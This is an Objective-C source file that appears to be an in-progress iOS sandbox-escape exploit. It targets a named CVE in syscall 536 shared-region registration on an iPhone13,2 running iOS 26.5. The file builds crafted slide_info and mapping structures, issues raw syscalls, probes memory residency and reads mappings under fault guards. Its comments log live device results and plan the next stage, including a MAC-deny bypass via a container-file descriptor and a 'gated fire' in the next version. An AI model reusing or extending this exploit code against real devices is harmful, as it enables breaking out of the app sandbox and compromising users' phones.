//
//  P022GC_GameCenter_Sandbox_Escape.m
//  P007OpenOnly
//
//  CVE-2026-43724 / syscall 536 no-file shared-region registration.
//  Target: iPhone13,2 A14 iOS 26.5 / 23F77
//
//  Live results so far (device, 2026-10-06):
//    v38 02:00: A3 files_count=0 → errno=0 SUCCESS (repeatable).
//    v39 02:06: geometry freedom RX/RW/RWX at 4 addresses; fault test
//               CONFOUNDED (read landed in pre-existing 108MB RX region).
//    v40 02:12: 16p RW @0x800000000 → errno=0, residency showed prot-0/0
//               reserved region, decisive read = SIGBUS (app crashed).
//               VERDICT: no-file registration is ACCEPTED but NOT
//               INSTANTIATED outside the shared region. No pager bind.
//    errno map: 0=accepted, 22=content-validate, 1=MAC-deny(fd path),
//               9=EBADF(fd lookup first), 4=copyin-stage.
//
//  v41 hypotheses:
//    H1: no-file mappings materialize ONLY inside the shared-region window
//        (the 0x180000000 prot-0/0 reservation). Register there + read.
//    H2: pager bind requires file backing; the gate is the EPERM MAC deny.
//        Test container-file fd with RW (v38's EPERM was on an RX mapping).
//  This build SURVIVES the fault: SIGBUS/SIGSEGV handler + siglongjmp.
//  ALL-0xFFFF slide_info → zero stores. Kernel-safe.
//

#import "P022GC_GameCenter_Sandbox_Escape.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <errno.h>
#import <stdlib.h>
#import <stdarg.h>
#import <signal.h>
#import <setjmp.h>
#import <sys/syscall.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <mach-o/dyld.h>

#define P022_BUILD       @"p022-sffd-neg1-mac-bypass-v41"
#define P022_SYS_536     536u

/* v5 slide_info geometry (Ghidra-pinned) */
#define P022_PAGE_16K       16384u
#define P022_SLIDE_HDR      24u
#define P022_VER_5          5u
#define P022_NO_REBASE      0xFFFFu
#define P022_STARTS_MAX     64u
#define P022_INFO_MAX       (P022_SLIDE_HDR + 2u * P022_STARTS_MAX)

/* v41 probe geometry */
#define V41_SHARED_ADDR     0x180000000ULL   /* shared-region window */
#define V41_SHARED_SIZE     0x4000ULL

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

@implementation P022GC_GameCenter_Sandbox_Escape

static int s_log_fd = -1;
static NSMutableString *s_log_buf = nil;

/* guarded-read plumbing (app survives SIGBUS/SIGSEGV) */
static sigjmp_buf g_fault_jmp;
static volatile BOOL g_in_guarded_read = NO;

static void p022_fault_handler(int sig) {
    if (g_in_guarded_read) {
        g_in_guarded_read = NO;
        siglongjmp(g_fault_jmp, sig);
    }
    /* not our read: restore default and re-raise */
    signal(sig, SIG_DFL);
    raise(sig);
}

static void p022_install_fault_handler(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = p022_fault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);
}

static void p022_write_log_init(void) {
    if (s_log_fd >= 0) return;
    s_log_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p022_gc_escape_log.txt"];
    s_log_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
}

static void p022_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [s_log_buf appendString:out];
    if (s_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) write(s_log_fd, s, strlen(s));
    }
    NSLog(@"p022 %@", line);
}

static void p022_log_flush(void) {
    if (s_log_fd >= 0) fcntl(s_log_fd, F_FULLFSYNC);
}

static NSString *p022_errno_name(int e) {
    switch (e) {
        case 0:  return @"SUCCESS";
        case 1:  return @"EPERM(MAC-deny)";
        case 2:  return @"ENOENT";
        case 4:  return @"EINTR(copyin-stage)";
        case 5:  return @"EIO";
        case 8:  return @"ENOEXEC";
        case 9:  return @"EBADF(fd-lookup)";
        case 12: return @"ENOMEM";
        case 13: return @"EACCES";
        case 14: return @"EFAULT";
        case 22: return @"EINVAL(validate-stage)";
        case 24: return @"EMFILE";
        default: return [NSString stringWithFormat:@"errno %d", e];
    }
}

/* All-NO_REBASE v5 slide_info for `count` pages. Zero stores for any count. */
static uint32_t p022_build_sinfo(uint8_t *out, uint32_t count) {
    memset(out, 0, P022_INFO_MAX);
    out[0] = P022_VER_5;
    uint32_t ps = P022_PAGE_16K;
    memcpy(out + 4, &ps, 4);
    memcpy(out + 8, &count, 4);
    for (uint32_t i = 0; i < count; i++) {
        uint16_t v = P022_NO_REBASE;
        memcpy(out + P022_SLIDE_HDR + 2u * i, &v, 2);
    }
    return P022_SLIDE_HDR + 2u * count;
}

/* 48B mapping entry (Ghidra-pinned layout). */
static void p022_build_mapping(uint8_t *m, uint64_t addr, uint64_t size,
                               uint32_t maxp, uint32_t initp) {
    memset(m, 0, 48);
    uint64_t fileOff = 0;
    uint64_t slideSize = 0;
    uint64_t slideStart = 0;
    memcpy(m + 0x00, &addr, 8);
    memcpy(m + 0x08, &size, 8);
    memcpy(m + 0x10, &fileOff, 8);
    memcpy(m + 0x18, &slideSize, 8);
    memcpy(m + 0x20, &slideStart, 8);
    memcpy(m + 0x28, &maxp, 4);
    memcpy(m + 0x2c, &initp, 4);
}

/* 12B shared_file_np entry. */
static void p022_build_file(uint8_t *f, int32_t fd, uint32_t mappings) {
    memset(f, 0, 12);
    memcpy(f + 0, &fd, 4);
    memcpy(f + 4, &mappings, 4);
}

/* One 536 call with explicit files_count/files. Returns errno. */
static int p022_call536(uint32_t filesCount, uint8_t *files,
                        uint8_t *mappings, uint8_t *sinfo, uint32_t sinfo_size,
                        long *retOut) {
    errno = 0;
    long r = syscall(P022_SYS_536,
                     (unsigned long)filesCount,
                     (unsigned long)(uintptr_t)files,
                     1UL,
                     (unsigned long)(uintptr_t)mappings,
                     (unsigned long)sinfo_size,
                     (unsigned long)(uintptr_t)sinfo,
                     0UL, 0UL);
    if (retOut) *retOut = r;
    return errno;
}

/* Residency probe: returns YES if a region covers `addr`, fills outputs. */
static BOOL p022_residency(uint64_t addr, uint64_t *outRegion,
                           uint64_t *outSize, int *outProt,
                           int *outMaxProt, uint32_t *outDepth) {
    vm_address_t region = (vm_address_t)addr;
    vm_size_t rsize = 0;
    struct vm_region_submap_info_64 info;
    mach_msg_type_number_t infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint32_t depth = 999;
    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &region,
                                            &rsize, &depth,
                                            (vm_region_recurse_info_t)&info,
                                            &infoCnt);
    if (kr != KERN_SUCCESS) return NO;
    if (outRegion)  *outRegion  = (uint64_t)region;
    if (outSize)    *outSize    = (uint64_t)rsize;
    if (outProt)    *outProt    = info.protection;
    if (outMaxProt) *outMaxProt = info.max_protection;
    if (outDepth)   *outDepth   = depth;
    return YES;
}

/* Guarded 8-byte read. Returns YES and fills *outVal on success. */
static BOOL p022_guarded_read(uint64_t addr, uint64_t *outVal) {
    if (sigsetjmp(g_fault_jmp, 1) != 0) {
        g_in_guarded_read = NO;
        return NO;
    }
    g_in_guarded_read = YES;
    volatile uint64_t *p = (volatile uint64_t *)(uintptr_t)addr;
    uint64_t v = *p;
    g_in_guarded_read = NO;
    if (outVal) *outVal = v;
    return YES;
}

+ (void)tap {
    p022_write_log_init();
    p022_install_fault_handler();

    p022_log(@"=== p022GC session %@ BUILD %@ ===", LabLocalMilitaryNow(), P022_BUILD);
    p022_log(@" ");
    p022_log(@"v41: H1 shared-region-window placement vs H2 file-backed bind.");
    p022_log(@"v40 verdict: no-file accepted at 0x800000000 but NOT instantiated");
    p022_log(@"(prot-0/0 reserved region; read = SIGBUS). This build SURVIVES faults.");
    p022_log(@"ALL-0xFFFF slide_info → zero stores. Probe only.");
    p022_log(@" ");

    uint8_t sinfo[P022_INFO_MAX];
    uint8_t mappings[48];
    uint8_t fbuf[12];
    long r = 0;

    /* ═══ H1: register inside the shared-region window ═══ */
    p022_log(@"━━━ H1: no-file @0x%llx (shared-region window) ━━━",
          (unsigned long long)V41_SHARED_ADDR);
    uint32_t s1 = p022_build_sinfo(sinfo, (uint32_t)(V41_SHARED_SIZE >> 14));
    p022_build_mapping(mappings, V41_SHARED_ADDR, V41_SHARED_SIZE, 0x5, 0x5);
    int e1 = p022_call536(0, NULL, mappings, sinfo, s1, &r);
    p022_log(@"  register → ret=%ld errno=%d (%@)", r, e1, p022_errno_name(e1));

    uint64_t reg1 = 0, sz1 = 0;
    int prot1 = 0, maxp1 = 0;
    uint32_t depth1 = 0;
    BOOL res1 = p022_residency(V41_SHARED_ADDR, &reg1, &sz1, &prot1, &maxp1, &depth1);
    if (res1) {
        p022_log(@"  residency → region=0x%llx size=0x%llx prot=%d/%d depth=%u",
              (unsigned long long)reg1, (unsigned long long)sz1,
              prot1, maxp1, depth1);
        p022_log(@"  (v39 baseline: 0x180000000 was prot=0/0 depth=1 —");
        p022_log(@"   if prot/depth CHANGED, the registration landed)");
    } else {
        p022_log(@"  residency → no region (unexpected for the window)");
    }

    uint64_t val1 = 0;
    BOOL ok1 = p022_guarded_read(V41_SHARED_ADDR, &val1);
    if (ok1) {
        p022_log(@"  read OK → 0x%016llx", (unsigned long long)val1);
        p022_log(@"  ★ faultable page in the shared window with no vnode ★");
    } else {
        p022_log(@"  read FAULTED (caught) → not instantiated in-window either");
    }

    /* ═══ H2: container-file fd with RW prot (exec-free) ═══ */
    p022_log(@" ");
    p022_log(@"━━━ H2: container-file fd, prot=RW (v38 EPERM was on RX) ━━━");
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *ctrl = [docs stringByAppendingPathComponent:@"p022_ctrl.bin"];
    int ctrlFd = open(ctrl.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (ctrlFd < 0) {
        p022_log(@"  container file open failed errno=%d — H2 skipped", errno);
    } else {
        char page[0x1000];
        memset(page, 0x41, sizeof(page));
        for (int i = 0; i < 4; i++) {
            write(ctrlFd, page, sizeof(page));   /* 0x4000 bytes */
        }
        uint32_t sb = p022_build_sinfo(sinfo, 1);
        p022_build_mapping(mappings, V41_SHARED_ADDR, V41_SHARED_SIZE, 0x3, 0x3);
        p022_build_file(fbuf, (int32_t)ctrlFd, 1);
        int eb = p022_call536(1, fbuf, mappings, sinfo, sb, &r);
        p022_log(@"  fd=%d prot=RW → ret=%ld errno=%d (%@)",
              ctrlFd, r, eb, p022_errno_name(eb));
        if (eb == 0) {
            p022_log(@"  ★★★ FILE-BACKED RW ACCEPTED — exec was the MAC trigger ★★★");
            uint64_t val2 = 0;
            BOOL ok2 = p022_guarded_read(V41_SHARED_ADDR, &val2);
            if (ok2) {
                p022_log(@"  read OK → 0x%016llx", (unsigned long long)val2);
                if (val2 == 0x4141414141414141ULL) {
                    p022_log(@"  ★★★ 0x41 CONTENT READ BACK = OUR FILE PAGES ARE LIVE ★★★");
                }
            } else {
                p022_log(@"  read FAULTED — registered but still not instantiated");
            }
        } else if (eb == 1) {
            p022_log(@"  EPERM persists without exec → MAC deny is on any fd path");
            p022_log(@"  (Ghidra: 0xa5d79d8 mac_file_check_mmap call conditions)");
        } else {
            p022_log(@"  new fd-path signature — classification data point");
        }
        close(ctrlFd);
        unlink(ctrl.UTF8String);
    }

    /* ═══ VERDICT ═══ */
    p022_log(@" ");
    p022_log(@"═══ VERDICT ═══");
    p022_log(@" ");
    if (ok1) {
        p022_log(@"H1 PASS: no-file mapping live in the shared-region window.");
        p022_log(@"v42 = crafted page_starts inside that window (gated fire).");
    } else if (e1 == 0) {
        p022_log(@"H1 FAIL: in-window registration accepted but not instantiated.");
    } else {
        p022_log(@"H1 FAIL: in-window registration rejected errno=%d.", e1);
    }
    p022_log(@"H2 result above decides the fd-path branch:");
    p022_log(@"  0     → file-backed RW bind works, exec was the gate");
    p022_log(@"  1     → MAC deny covers all fd paths; Ghidra 0xa5d79d8 callers");
    p022_log(@" ");
    p022_log(@"Zero stores this session. All entries 0xFFFF. Probe only.");

    p022_log_flush();
    if (s_log_fd >= 0) {
        close(s_log_fd);
        s_log_fd = -1;
    }
}

#pragma clang diagnostic pop

@end
